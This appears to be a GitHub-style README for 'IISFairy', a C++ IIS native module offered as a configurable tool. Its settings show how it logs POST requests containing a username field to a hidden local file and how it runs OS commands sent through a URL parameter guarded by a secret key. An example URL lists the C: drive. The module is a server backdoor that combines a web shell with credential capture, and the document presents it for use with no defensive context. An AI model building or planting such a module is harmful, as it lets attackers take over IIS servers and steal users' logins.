# IISFairy
Simple PoC IIS Native module coded in c++, it's able to capture post request to a specific urland exucte commands through url request.

# Settings
Before compiling make sure to set below settings so it suits to your needs.

<b>Logging part :</b>

--> Page to save Post Request for :
PCWSTR getPostRequestfromthisUrl = L"yourmomistheiisfairy.html";

--> Trigger parameter in Post Request to start the log :
LPCSTR lpFound = strstr((LPCSTR)FormData, "username");

--> Local location to save logfile to :
std::wofstream outputFile("C:\\yourmomtheiisfairy.txt", std::ios::out | std::ios::app);

<b>CMD part :</b>

--> Parameter in get url request to activate cmd detection, a.k.a. password :
PCWSTR activateCMDtrigger = L"secretkey=iisfairy";

--> Parameter in get url request to get cmd from :
std::string paramValue = UrlDecode(ExtractQueryParamValue(urlBuffer, "sauce"));

--> Url request example to display C:\ directory :
http://localhost/yourmomistheiisfairy.html?secretkey=iisfairy&sauce=dir%20C:\







